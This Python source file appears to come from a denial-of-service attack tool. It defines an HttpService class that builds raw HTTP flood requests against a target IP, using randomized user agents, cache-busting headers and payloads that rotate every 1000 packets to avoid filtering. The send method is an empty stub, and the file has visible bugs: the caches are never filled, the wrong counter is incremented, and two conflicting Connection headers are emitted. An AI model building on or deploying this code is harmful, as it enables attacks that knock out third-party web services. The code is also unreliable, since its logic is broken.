from typing import Optional

from constants import CRLF
from shared.attacks import AttackRequest
from shared.attacks.core import BaseService
from shared.attacks.http import HttpAddress, HTTPMethods
from shared.randoms import Random


class HttpService(BaseService):
    def __init__(self, attack_request: AttackRequest) -> None:
        super().__init__()
        self._attack_request = attack_request
        self.__duplicates_headers_counter = 0
        self.__duplicates_random_data_counter = 0
        self.__cached_headers: Optional[bytes] = None
        self.__cached_random_data: Optional[bytes] = None

    def send(self) -> None:
        pass

    def __get_headers(self) -> str:
        return CRLF.join(
            (
                r"X-Requested-With: XMLHttpRequest",
                r"Connection: keep-alive",
                r"Pragma: no-cache",
                r"Cache-Control: no-cache",
                r"Accept-Encoding: gzip, deflate, br",
                rf"User-agent: {Random.get_user_agent()}",
            )
        )

    def _get_random_headers(self, http_method: HTTPMethods) -> bytes:
        if not isinstance(self._attack_request.address, HttpAddress):
            raise Exception("You can use only HttpAddress with this attack")

        address: HttpAddress = self._attack_request.address
        headers: str = self.__get_headers()

        data = CRLF.join(
            (
                rf"{http_method.value} {address.path} HTTP/1.1",
                rf"Host: {address.target.ip}",
                headers,
                rf"Connection: Close{CRLF}{CRLF}",
            )
        )

        return data.encode()

    def _get_http_headers(self, method: HTTPMethods = HTTPMethods.GET) -> bytes:
        if self.__duplicates_headers_counter % 1_000 == 0:
            self.__cached_headers = None

        self.__duplicates_headers_counter += 1

        return self.__cached_headers or self._get_random_headers(method)

    @property
    def _random_data(self) -> bytes:
        if self.__duplicates_random_data_counter % 1_000 == 0:
            self.__cached_random_data = None

        self.__duplicates_headers_counter += 1

        return self.__cached_random_data or Random.get_bytes()

    def http_payload(self, method: HTTPMethods = HTTPMethods.GET) -> bytes:
        """Change HTTP payload every 1000 packets"""
        return self._get_http_headers(method) + self._random_data
